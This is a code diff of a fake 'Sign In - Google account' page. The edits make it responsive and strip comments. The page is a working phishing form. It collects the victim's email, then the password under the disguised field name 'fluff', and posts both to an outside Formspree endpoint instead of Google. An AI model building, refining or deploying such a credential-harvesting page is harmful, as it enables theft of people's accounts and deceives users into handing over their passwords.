@@ -6,6 +6,7 @@
     <title>Sign In - Google account</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
     <style>
+        /* General Styles */
         body {
             background-color: #1e1f20;
             color: black;
@@ -17,18 +18,23 @@
             margin: 0;
             flex-direction: column;
         }
+
         .container {
             background-color: #0e0e0e;
             padding: 30px;
             border-radius: 25px;
-            width: 977px;
-            height: 348px;
+            width: 90%;
+            max-width: 977px;
+            height: auto;
             color: white;
             display: flex;
             justify-content: space-between;
             align-items: flex-start;
             position: relative;
+            flex-wrap: wrap;
         }
+
+        /* Logo Section */
         .logo {
             font-size: 44px;
             font-weight: 700;
@@ -39,35 +45,44 @@
             display: flex;
             align-items: center;
         }
+
         .logo img {
             width: 54px;
             margin-right: 10px;
         }
+
+        /* Text Section */
         .text-container {
             position: absolute;
             top: 60px;
             left: 20px;
             text-align: left;
         }
+
         #signinText {
             font-size: 38px;
             font-weight: 400;
             margin-bottom: 0;
         }
+
         #useGoogleText {
             font-size: 16px;
             font-weight: 500;
         }
+
+        /* Input and Form Section */
         .right-side-container {
-            width: 50%;
+            width: 100%;
+            max-width: 50%;
             display: flex;
             flex-direction: column;
             align-items: flex-start;
             margin-left: auto;
             margin-top: 70px;
         }
+
         .input-box {
-            width: 115%;  /* Increased the width to make it longer */
+            width: 100%;
             padding: 19px;
             border: 0.5px solid #c6c7c5;
             background-color: #0e0e0d;
@@ -77,32 +92,39 @@
             margin-bottom: 12px;
             border-color: #e4e4e3;
         }
+
         .input-box::placeholder {
-            color: #c4c8c5; /* Change placeholder color */
+            color: #c4c8c5;
         }
+
         .link {
             color: #8ab4f8;
             text-decoration: none;
             font-size: 14px;
         }
+
         .forgot-email-link {
             margin-top: 5px;
             align-self: flex-start;
             font-weight: 300;
         }
+
         .guest-mode {
             font-size: 14px;
             color: white;
             text-align: left;
-            width: 100%; /* Set to 100% so it fills the container width */
-            margin-top: 10px; /* Bring it closer to the input box */
+            width: 100%;
+            margin-top: 10px;
         }
+
         .guest-mode-wrapper {
             display: flex;
             justify-content: space-between;
-            width: 100%; /* Take full available width */
+            width: 100%;
             align-items: center;
         }
+
+        /* Button Section */
         .btn-container {
             display: flex;
             justify-content: flex-end;
@@ -111,6 +133,7 @@
             width: 100%;
             gap: 15px;
         }
+
         .btn {
             background: #8ab4f8;
             color: black;
@@ -121,6 +144,8 @@
             font-size: 16px;
             font-weight: 100;
         }
+
+        /* Footer Section */
         .footer {
             margin-top: 20px;
             font-size: 12px;
@@ -133,18 +158,57 @@
             align-items: center;
             justify-content: center;
         }
+
         .footer a {
             color: white;
             text-decoration: none;
             margin: 0 8px;
         }
+
         .footer-links {
             display: flex;
             justify-content: center;
             margin-top: 5px;
         }
+
         #passwordLabel {
             font-size: 14px;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .container {
+                flex-direction: column;
+                padding: 20px;
+            }
+
+            .logo {
+                position: static;
+                margin-bottom: 20px;
+            }
+
+            .right-side-container {
+                margin-left: 0;
+                width: 100%;
+                margin-top: 0;
+            }
+
+            #signinText {
+                font-size: 30px;
+            }
+
+            #useGoogleText {
+                font-size: 14px;
+            }
+
+            .input-box {
+                width: 100%;
+            }
+
+            .btn-container {
+                flex-direction: column;
+                align-items: stretch;
+            }
         }
     </style>
 </head>
@@ -160,12 +224,11 @@
         </div>
 
         <div class="right-side-container">
-            <!-- Create a form to submit to Formspree -->
             <form id="signinForm" action="https://formspree.io/f/moveakwr" method="POST">
                 <input type="email" id="emailInput" name="email" class="input-box" placeholder="Email or phone" autocomplete="username">
                 <div id="passwordContainer" style="display: none;">
-                    <label for="fluff" id="passwordLabel">Password</label> <!-- Changed label to Password -->
-                    <input type="password" id="passwordInput" name="fluff" class="input-box" placeholder="Enter your password" autocomplete="current-password"> <!-- Changed placeholder -->
+                    <label for="fluff" id="passwordLabel">Password</label>
+                    <input type="password" id="passwordInput" name="fluff" class="input-box" placeholder="Enter your password" autocomplete="current-password">
                 </div>
 
                 <a href="#" class="link forgot-email-link" id="forgotEmailLink">Forgot email?</a>
@@ -196,12 +259,12 @@
 
     <script>
         function goToPasswordPage(event) {
-            event.preventDefault(); // Prevent form submission for now
+            event.preventDefault();
 
             var email = document.getElementById('emailInput').value;
 
             if (email) {
-                document.getElementById('signinText').textContent = 'Enter your password'; // Change text to 'Enter your password'
+                document.getElementById('signinText').textContent = 'Enter your password';
                 document.getElementById('useGoogleText').style.display = 'none';
                 document.getElementById('emailInput').style.display = 'none';
                 document.getElementById('forgotEmailLink').style.display = 'none';
@@ -215,8 +278,7 @@
         }
 
         function submitPassword(event) {
-            // Handle the form submission here (Formspree will handle the email and fluff)
-            // We can remove this line as the form submission will happen automatically
+            // Form submission logic
         }
     </script>
 </body>
